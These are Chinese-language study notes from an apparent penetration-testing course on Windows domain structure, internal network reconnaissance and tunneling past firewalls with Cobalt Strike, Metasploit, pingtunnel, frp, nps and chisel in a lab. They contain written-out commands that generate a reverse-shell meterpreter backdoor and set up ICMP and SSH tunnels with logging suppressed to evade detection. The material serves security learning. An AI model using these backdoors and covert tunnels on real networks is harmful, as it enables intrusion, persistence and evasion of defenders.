# 2024 ---  内网

# 168：域

分类：单域、子域、父域、域树、域森林、DNS域名服务器

单域环境：

![1732196598012](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942982.png)

父子域：![1732196518518](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942983.png)

域树 ：

![1732196624195](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942984.png)

 域森林  test和abc 直接取得了信任关系      在他们下面就是域森林

![1732196642767](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942985.png)



虚拟机分类：

windows    2016  DC  域控

windows    2008   WEB  网站服务器

Windows 10&7    PC  普通办公电脑

  配置环境 

dns 和ip  配置：

 为了域控能够控制网内每一个主机的流量（网站解析流量），这里就让内网每一个主机用同一个dns解析

对ip 进行静态设置

## 单域

后面的dns服务器都指向DC（  dns服务器） 的ip192.168.22.11

![1732202058737](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942986.png)



![1732202614066](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942987.png)

https://mp.weixin.qq.com/s/128Ap8ohEBDweg0jNM-T5g 常见命令

   工具插件

win7激活

域内：域内用户

域外：1、需要取得这个主机的系统权限或者这个主机的域内权限（换成域内用户）

判断是否为域内用户：（这里权限就是普通用户xd）

![1732244300080](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942988.png)



高权限也可以执行net user /domain        (administrator/system)

![1732244399149](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942989.png)



net time /domain  定位域控 （一般域内主机都以域控主机的时间为主）

知道域控的域名后直接ping 得到ip

  提权win10

# 169:父子域（多域）

搭建父子域环境（本机内存配置不支持，没有搭建成功）

net user /domain 只能看到自己这一级的上一级域控，上上级和旁级都看不到。

![1732256467561](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942991.png)

net view /domain   查看当前所有域的上级关系。需要开一个配置![1732258184854](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942992.png)

单域：

![1732256749563](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942993.png)



多个父子域：

![1732256755131](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942994.png)

子域下面的DC互相通讯不了，操作更改也是，父域可以改子域，但是不能改同一级的父域。

主要大多数还是配置环境（域环境）

# 170：域森林，域树林

域树林：最上面是一个父域

域森林：最上面有多个父域

##### 信任

森林的话---树之间需要配置信任关系（能通讯）这里就是xiaodi8.org个xiaodi.org信任关系建立

![1732268093923](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942995.png)

![1734016003951](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942996.png)

配置dns也是一级一级的向上匹配。

树林和森林之前的区别就是最上面是一个父域还是多个父域

xiaodi.org和xaiodi.org

1h20,      有时候A父域跟其他B父域相互信任，但是A子域不一定和B子域相互信任，主要看配置。

这节课主要还配置

#### 配置环境：

补充一下、怎么加域，这里是老版本的，win10以上差不多：

![image-20241223174332058](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942997.png)

![image-20241223174435398](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942998.png)

这里注意：加域就隶属于域，写好域名，输入DC账户密码就行，如果是重新进域，就得先加入工作组，随便进一个，重启后在重新进域就可以了。

![image-20241223174508491](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942999.png)



win10：

![image-20241223174854971](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942000.png)

哦对，再补充一下，在保证你的网段和DC在同一个网段下时候，加域报错什么找不到域啊啥的，就重新设置一下ip的分布，在加：

![image-20241223175510433](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942001.png)



# 171：内网信息收集

不出网：没网络（上不了网）     /      限制你上网，限制了流量

网络不可达：指的是内网---没网自己的主机也可以和虚拟机互通

环境配置：环境帐号密码：administrator/xiaodi 	这里没有搭建windows2016 DC机		

这里配置就是让本机访问不到2 、3 、4三个网段，模拟内网环境，真实

![1732341321876](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942002.png)

![1732342725259](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942003.png)

下图中因为都在一个网段（192.168.139.  * -----192.168.139. *   ）互相联系，所有最后都可以通信

### 总况

![1732271126086](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942004.png)

### Windows

ipconfig /all 	 ；一个主机上有2个网段



![1732341893489](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942005.png)

在sql主机上搭建一个网站：

![1732342405010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942006.png)

web和sql直接是2网段通信：

![1732342569419](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942007.png)

![1732342591772](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942008.png)

信息收集：使用代理就不用将自己的工具上传到目标主机上进行渗透，只需要放自己主机上进行操作。代理就是添加一个节点（sockS）

 上线操作设置代理          回头时将Proxifier配置，主要是原理，重新理解一下

socks代理，就是理解为在自己的攻击机上(这里的攻击机为cs服务器，也就是kali)打开一个16150的端口，用这个端口节点和目标web机建立通信

![1732343327086](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942009.png)

所有这里代理配置时候也是连接的kali（攻击机）的ip (要用kali的这个接口016150与目标建立通讯)

![1732343472979](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942010.png)

配置好代理，就是通过cs服务器（kali ）建立了一个节点16150，来连接了目标web主机，然后通过代理这个节点就可以与目标主机web进行通讯，

![1732345799165](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942011.png)

因为目标主机web能与sql主机进行通讯，所有通过代理节点，本机也可以与sql主机通讯

![1732345781534](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942012.png)

能在内网主机访问，外网主机想访问22 时需要用proxifier走个代理进行通讯，或者用fscan 扫描信息。但是proxifier一关就不能通讯，fscan也扫不到信息

![1732346749235](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942013.png)

​    reverse 反向

​				bind       正向 		 不需要配置ip	4.exe

反向就是：以攻击机为第一人称，让目标机器主动连接攻击机。一般用reverse 反向 ，因为防火墙一般对外部到内部过滤严格，内部出去到外部过滤很少。

正向：还是以攻击机为第一视角，让目标主机开一个口子，然后等着攻击机连接自己。

这里就是sql主机正常反向连接是找不到c2服务端(kali)，因为没在一个网段 。所以就做一个正向后门，让sql主机正向连接，反向是有目标，正向是不知道目标。

下面演示的是正向：

这里正向监听器就没有配置ip ,也就是说，用这种监听器生成后门，默认就是绑定自己（cs）的4444端口

![1732347332244](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942014.png)

生成正向后门：

![1732347681381](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942015.png)

![1732347798808](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942016.png)

运行4444.exe后，发现sql机主动开了一个4444端口（等待别人来连接）：

![1732347820581](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942017.png)

然后用 cs控制Web主机连接sql机：

![1732347931397](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942018.png)

sql主动找的web，间接找的kali    ------------ 这就是正向

![1732347999544](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942019.png)



### xd视频演示：

kali （攻击机）刚开始只能与web主机进行通信，然后上传后门到web主机上线操作，控制得到权限后，因为kali 不能与sql主机进行通信，但是web主机可以与sql进行通信（上图），所有可以kali通过控制web主机（connect 192.168.2.22 4444）连接sql主机。

![1732287156916](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942020.png)

在sql主机上也有一个后门点击会打开自己的4444端口等待连接

  file主机开了一个ftp服务，还是改proxifier，通过ftp拿到file主机权限（这里过程粗略跳过），

连接file主机一样过程：socks代理----proxifier代理（这里注意：配置的服务器还是c2（kali）,更改的是端口和代理规则的目标主机ip--192.168.3.*-----fscan扫-------上正向后门）后面一样

连接DC：

还是先建立socks代理（开一个节点）                                      这里遮住的是192.168.3.22（file主机）

![1732287986076](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942021.png)

接下来配置proxifier

1:	

![1732288157910](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942022.png)

2:

![1732288132353](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942023.png)



下来还是用fscan进行扫描。后面一样。

 

### msf：

linux中的Proxifie是Prixychains。

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.139.128 LPORT=3333 -f exe -o msf.exe  生成一个反向连接后门

![1732348972625](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942024.png)

这里shell后查看路由：（看web目标机上的路由--发现有139和2网段两个）：

![1732349158160](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942025.png)



下来和刚才一样，用的是 auxiliary/server/socks_proxy    模板来 创建socks节点：版本用5 端口set 为8989

![1732349444274](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942026.png)

用windows的代理配置：

![1732349539438](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942027.png)



用linux的代理访问： Proxychains   （模板）  （linux）

![1732350057902](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942028.png)

这里和刚才cs一样：就是用msf生成一个正向exe：

![1732350602586](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942029.png)

下来连接sql机时web机的session不能掉线：是通过Web来通讯sql的

![1732350933447](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942030.png)

sql机上线  正向exe：

![1732352609023](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942031.png)

还是创建socks 。：

![1732352648446](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942032.png)

与file机建立通讯：

![1732352681445](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942033.png)



sessions：

一台控制一台

![1732352885051](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942034.png)

有时候socks代理好了但是ping 不通，这是因为ping走的是icmp协议，但是socks走的协议没有ping 的级别高

 演示后续

最开始是：  ----- 基础网络知识        这里kali只要和内网一台主机通讯就行（公网 / 有节点）

先上线后创建socks节点----------挂上Proxy代理----------生成正向exe---------等待上线



# 172：防火墙

 ：配置

隧道技术：

icmp    dns:解析网站域名IP 协议 				 ssh : 连接linux主机的通信协议

也能看见，出站默认是允许的

![1732443049734](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942035.png)

  连接内网sql   ,

web有防火墙sql没有         

  web没有sql有防火墙 	所以正向后门连接不上

  防火墙入站出战配置

web到sql 之间有防火墙、这里是在web上建立一个反向监听器，让sql主机主动找web

![1732437963303](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942036.png)

演示：

web 机的ip：

![1732445259720](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942037.png)

这里就是让web机设立一个监听器，让sql机来连接web（出站）：

![1732445446401](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942038.png)

生成反向后门: 

![1732445495430](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942039.png)

这里对比，在将刚才的后门123.exe，和4444的正向后门上传上去：

sql主机主动连接web机：



![1732445944278](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942040.png)

执行3个exe后，connect 192.168.2.22 4444 不行说明防火墙阻拦了入站，123.exe不行说明sql和kali（c2服务器不通讯）1234.exe成功上线说明sql(22)成功出站连接到222（web机）

![1732446104395](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942041.png)







下面这种情况是正反都不行---都不能上线：

kali---->web 用反向连接成功上线，但是web 到sql :正向(web--->sql)有sql的入站防火墙，反向连接（sql--->web）对于web来说就是入站，也有入站防火墙

![1732438005147](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942042.png)



3种方法解决：

1、用命令关闭防火墙。

2、SMB协议通讯上线（默认放行）

3、利用隧道技术上线（规则决定）

 关闭sql防火墙进行正向连接

  内网域中：看怎么关闭防火墙。

   关闭防火墙失败，拿到system* 权限也没有关----在域环境中

1h14 smb（文件打印和共享）协议通讯、钻空子

隧道技术： 就是改协议，将一个被防火墙禁止的协议改成一个可以允许通过的协议。将正向后门走icmp协议

第三种：主要还是看防火墙的策略配置。

# 173：隧道技术 icmp dns

![1732452050196](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942043.png)

出网：看之间是否能通讯

​	c2常见的协议

隧道技术：绕过防火墙，实现通讯能够上线

出网就是出站----防火墙

  配置

将出站规则都开启，执行后面没有上线

![1732461696691](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942044.png)

将出站规则关闭：

![1732461815088](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942045.png)

打开icmp通讯：192.168.139.128为kali地址,与web机在同一个网段------------此时web防火墙入站和出站是开着。这里都是随便ping 只要能互相通信就行

![1732462308609](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942046.png)

关闭icmp协议: 

![1732462439111](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942047.png)

### icmp:

这里的环境复现是：其中kali的ip  192.168.139.128       web :192.168.139.222       192.168.2.11

![1732523729550](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942048.png)

  上线  使用工具 pingtunnel

./pingtunnel -type server

工具将本地tcp流量用自己的6666端口流量转发到192.168.139.141:7777 上面（将tcp流量封装成icmp转发）

pingtunnel -type client -l :6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp 1 -noprint 1 -nolog 1   后门生成绑定6666，上线监听7777，上线找7777。			这个工具就是封装作用  （ 1 -noprint 1 -nolog 1  就是减少流量特征的，不打印信息）

下面本应该是在webshell页面执行，但为了省事，就直接在目标机web上进行操作：

上传工具pingtunnel，然后在能和目标机通讯的机器上 ，（这里是kali）创建一个监听：

![1732524394790](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942049.png)

执行转发命令-----前面几次没有成功是因为web机的出站icmp没有开：、

![1732525019259](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942050.png)

成功接收到：

![1732524956671](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942051.png)

生成2个监听器：1 、2

![1732525288157](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942052.png)

下面生成exe、要选择stageless的，如果选择（E）上面的那个模式，无法上线（踩坑）：这里exe的监听器为1

![1732526027873](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942053.png)

执行66666.exe则就反射到本地6666来上线，而6666又经过一系列的转发成icmp到7777才出去，2监听器监听7777成功收到web机请求上线。

![1732526222224](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942054.png)

然后用wireshark监听流量发现，web机过来的全部是icmp协议的数据包（http----->icmp封装成功）：

![1732526418330](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942055.png)

隧道一关闭、cs就掉线：

![1732526561513](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942056.png)

### dns

  使用DNS技术实现上线----使用C2自带工具。 关闭icmp通讯出站。打开dns出站规则。这里上线需要一个dns的域名网站来上线dns的exe，这就是dns协议实现上线

关闭icmp出站协议，打开dns协议

![1732526830482](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942058.png)

下面还是本应该在webshell操作。我懒的上线get，就直接在主机上演示：

这里还得需要一个dns的域名。省略这个

### msb:

  MSF icmp实现上线。msf的dns过时，已下架。

   smb开放着，利用smb进行通讯，为入站规则

![1732529462918](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942059.png)

可以通过smb来正向连接来获取权限。这里属于横向移动知识点，后期在学

### 内网穿透:

   这里的状况（防火墙策略）是 web机器是只让web进，icmp出。隧道技术就是有一些放的口子（有一些出站的规则），这种一般都是内网穿透。演示一款工具：iox       pingtunnel                                                                                                   2222->4455->5566                   pingtunnel -type client -l 127.0.0.1:2222 -s 192.168.139.128 -t 192.168.139.128:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000           （这里的key是防止别人也连接到你打pingtunnel，所以有一个key）    192.168.139.141为kali   127.0.0.1web机器，因为web机的防火墙策略。所以这里命令就是将web机的2222端口的tcp协议的流量封装成icmp协议给发送到192.168.139.141:4455（kali的4455端口），在kali(攻击机)./pingtunnel -type server -noprint 1 -nolog 1 -key 000000接收目标发过来的icmp流量数据，然后因为是发到自己的4455端口，所以./iox proxy -l 4455 -l 5566  用iox代理工具将4455转至5566端口。在web机上还要建立SockS节点绑定2222端口----相当于创建一个2222端口，他才能将icmp流量数据转发出去：iox.exe proxy -r 127.0.0.1:2222。类似上面的socks端口创建，因为这里目标机的防火墙策略特殊，所以采用这种方法创建socks节点。后面就一样用代理Profiex连接socks，从而实现与目标机通讯。

将web本地2222端口的TCP封装IMCP给能通讯的kali：-----已经将iox和pingtunne上传目标机了

![1732531243372](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942060.png)

接收客户端传递的ICMP：

![1732531600655](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942061.png)

端口转发，创建有socks5协议 ：

![1732531373768](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942062.png)

再在web上开放一个2222端口：

![1732535373473](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942063.png)

最后效果就是在本机能访问到目标主机，之间建立通讯。

# 174：隧道技术 http ssh

ssh目前只能通讯，不能上线，目前没有c2工具能利用ssh上线。     [192.168.2.11](http://192.168.2.11/) 192.168.139.222 都是web机。

### http:

http隧道上线一般意义不大，能通过http上线就能通过正反向上线

![1732609043452](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942064.png)

在情况1下，无法通过c2上线控制web机。因为入站只有web端口：80或者443，这两个端口都被占用，所以只能通过webshell工具来控制web机，而且也没有办法通过Web机控制sql，因为web的出站被限制。所以就需要通过隧道技术来实现让sql跟web机连接        这里是通过Web来建立隧道获取sql机上的有价值信息

  看防火墙配置，这里本机只能访问192.168.139.222       2.11 和 2.22 都访问不到     同一个网段好像可以不用看防火墙就能访问，不在同一个网段就得看防火墙策略。

eg: 192.168.139.1 可以访问192.168.139.2     如果192.168.139.2还有一个网段是192.168.2.2  那么192.168.139.1访问192.168.2.2 是访问不到的

![1732618408454](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942065.png)

![1732619300723](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942066.png)

  HTTP隧道搭建内网穿透    Neo-reGeorg-5.2.0工具使用说明，现在是用工具脚本创建一个socks代理。

![1732617986195](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942067.png)

这里将刚才用工具生成的php后门上传到可以通讯的web服务器192.168.139.222  上：

![1732618278013](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942068.png)

socks代理：

![1732618686942](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942069.png)

配置代理------Proxifier

![1732618847723](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942070.png)

然后就访问成功：

![1732619184404](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942071.png)

隧道实现成功

  哥斯拉，冰鞋；冰鞋：本机用隧道技术实现将目标端口（sql）80转发到本地端口2222上，先在本地上线到可以通讯的web机上，然后在信息收集到sql机，利用内网穿透，隧道技术实现

冰鞋复现失败，虚拟机问题：

![1732624362316](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942072.png)

   哥斯拉

端口映射，本地访问远程端口数据 主动转发出来  建立socks代理，连接socks对内网穿透

这里关闭刚才的socks和Proxifier代理：

![1732624587566](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942073.png)

然后哥斯拉连接上web，使用httpProxy：

##### ![1732624748652](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942074.png)

配置代理，访问192.168.2.22   成功

![1732624869350](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942075.png)

  上线c2

http一般不用来上线，http能上线的话，那么正反向也可以用来上线，一般都会用正反向来实现上线。http隧道一般用来信息收集，主要还是因为http在tcp层。

   ssh

​    首先是被控机跟目标机之间能通讯、让被控机(kali2)将内网机(sql)的80端口流量转发到攻击机(kali)上的1234端口，这里就是攻击机访问自己的1234端口，就等于被控机访问内网机的80端口。不过这里需要配置好环境，在腾讯文档中                                                                                           		ssh -CfNg -R 攻击机端口:内网目标机IP:80 root@攻击机ip                     

  	cs工具默认不支持linux mac  ios andior等这些机器上线，这里需要用到插件才支持这些操作系统上线，用插件生成后门文件后上传到目标系统机上执行。

先将两个文件上传到cs服务器，在向cs里导入脚本：

![1732625412067](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942076.png)

配置生成：

![1732625591959](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942077.png)

在事件日志这儿会有生成后门文件的命令：

![1732625633943](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942078.png)

生成后门，这里是生成的linux系统的上线文件：

![1732625793578](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942079.png)

执行上线文件，成功linux系统（kali ）上线：

![1732625831874](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942080.png)

# 175：项目工具

FRP      NPS      Chisel         传输层

  配置frp

frp建立通道   可以实现跨内网通讯，两个内网的机可以互相通讯。需要配置.ini 文件，这里的serverAddr的地址为跳板机的地址，frps文件配置在跳板机上。frpc放在自己的攻击机上。[[proxies]]是名字可以更改任意，上面的两个配置是尝试连接远程服务地址。下面是尝试将（因为这里没有remoteip地址，所以remotePort就是上面服务端的端口）远程服务端6000 转到 本地客户端（127.0.0.0 这里的本地就是cs的上线服务端kali）的22端口  采用的是tcp协议，备注名字为[[proxies]]

![1732633988373](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942081.png)

配置信息：将远程的6666端口转发到本地的5555端口。

![1732702974123](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942082.png)

成功建立连接：

![1732703083871](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942083.png)

然后在生成2个监听器，分别为1---远程服务端的和2---本地服务端（kali）地址的监听器。用1监听器生成一个后门。然后1后门执行就会访问远程服务端，因为frp会将这上线访问转发到本地服务端，那么2监听器就能获取到上线。1后门执行在一个内网机A中，A是可以访问到外网1远程服务端，而1又转发到内网机B上，那么就实现了AB内网机之间通信。借助了外网服务器作为跳板。frp充当隧道建立连接。

![1732635242104](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942084.png)

生成远程服务器的后门 --  6666.exe：

![1732703667565](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942085.png)

成功上线，并通过frp隧道转发到kali上，成功上线（frp1生成后门，frp2监听上线）---这里的真实环境是 web 机在一个北京内网中，kali的cs在一个武汉内网

![1732703877152](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942086.png)



可以将生成的后门丢微步在线里，会自动溯源到你的跳板机（外网机上），实际你是在内网的服务机（kali）上上线的。有一定的隐藏，防溯源。         frps    服务端         frpc  客户端             socks要看入站检测（通过节点进去），端口映射要看出站检测（让他把自己的端口映射出来）

####   frp 

信息收集：建立socks节点做信息收集             端口映射转发做信息收集

   frp建立socks节点。上面frp的客户端是kali主机，但是如果还在kali上建立socks节点，kali上没有2网段，还是访问不到目标的2网段内网口。所以节点需要在目标139的外网口上建立

在被控机web上执行frpc，将远程服务端的6000端口成为socks代理，接下来只要通讯服务器的代理就可以通讯到客户端（被控机）

![1732708755237](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942087.png)

配置frpsocks.ini文件，让服务器开一个web页面。7000端口是用来通讯的，7500是用来看web页面的

![1732709310211](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942088.png)

执行后，可以看到frp通讯的一些信息：

![1732709568486](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942089.png)

成功建立socks节点，这里注意：这个socks的ini ，客户端的编写一定要注意书写规范（已踩坑）

![1732711385101](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942090.png)

这里配置代理前还是在本机（武汉内网）访问不到目标内网主机：

![1732711469615](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942091.png)

配置代理，成功访问：

![1732711597803](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942092.png)



用到frp建立socks的场景就是：拿到目标的webshell后但是被出入站等原因阻止导致上线不了cs，而又要对目标主机进行信息打点（收集），那么这时就用不了cs来建立socks节点，所以就上传frp到被控机创建socks节点。                                                                                                                  条件：出站没限制。------  这里是相当于用被控机来访问内部网络，（看上面的图，为2.11的内网口）所以没限制就是指的是能访问内网口没限制，不是指出站都没限制。

  端口映射，这下相当于是以目标的139网段为跳板机来访问内网2网段。将内网段2的流量映射到外部服务器上。这两个方法差异还是出入的问题：

![1732714593709](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942093.png)

成功代理，访问服务器8888端口：---代理转发

![1732714659626](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942094.png)

#### 1h04 nps     

配置nps：ini / conf  文件

![1732715155373](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942095.png)

打开页面：     nps服务端 

![1732715251108](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942096.png)

 npc 客户端，新建客户端：

![1732715614970](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942097.png)

客户端执行命令：

![1732715611109](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942098.png)

新增tcp隧道，将服务端6666端口转发到本地（谁执行的客户端命令---kali）5555端口：

![1732715763204](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942099.png)

![1732715776156](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942100.png)

生成后门，监听上线--通过tcp隧道转发：

![1732715913620](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942101.png)

##### socks节点：

这里就不能用刚才的kali为客户端，因为kali通讯不到内网机（2.11网段），需要在被控机上建立客户端socks：

![1732716388883](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942102.png)

上面web隧道中选择socks代理：

![1732716085384](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942103.png)

插件或者Proxifier设置:

![1732716664025](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942104.png)

   

##### 端口映射 

访问服务端8899相当于访问192.168.2.22:80

![1732716752088](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942105.png)

![1732716834453](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942106.png)

#### chisel:

1h24 较前面的两款较为冷门-------流量特征好改

服务端打开：c2上线：

![1732717569073](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942107.png)

 还有一样1后门，2监听。web执行1（6666.exe）后2监听上线。命令：建立与8.152.160.76:1234的连接，将远程的6666端口的流量给到自己192.168.139.128:5555端口![1732717540398](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942108.png)

![1732717870520](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942109.png)

socks节点：

![1732718527371](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942110.png)

代理转发：

![1732718482456](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942111.png)

访问成功：

![1732718498526](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942112.png)

# 176:SPN技术

## 信息收集

信息收集----前况：--------为横向移动打基础

要注意拿到权限主机当前的角色（内网域用户还是普通）和当前区域，dmz区域：防火墙太严格会影响正常业务，太简单会有风险，所以有一种中间区域就是dmz区域。   

1、先判断内网是工作组（局域网）还是域内，直接执行域内的命令。不是域内还是工作组                                           （内网：查ip，看内网有没有ip存活等特征判断是不是内网----------ipconfig有多个内网ip就是） arp -a ：发现同网段其他ip，则为内网。

![1732769111424](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942113.png)

域内命令，执行没有，则就是在工作组中，（局域网）：

![1732769201341](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942114.png)

  本机上查看dns      ipconfig /all 判断存在域-dns 有域的有dns后缀，无域的无dns后缀

![1732772984451](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942115.png)

在域内主机写ipconfig /all  有Dns后缀显示

![1732773151130](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942116.png)

net time /domain 获取主域名，其实这个就是主域的计算机名，再通过nslookup或ping命令来获取主域的IP地址。定位DC

![1732773435662](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942117.png)

3、定性被控机     

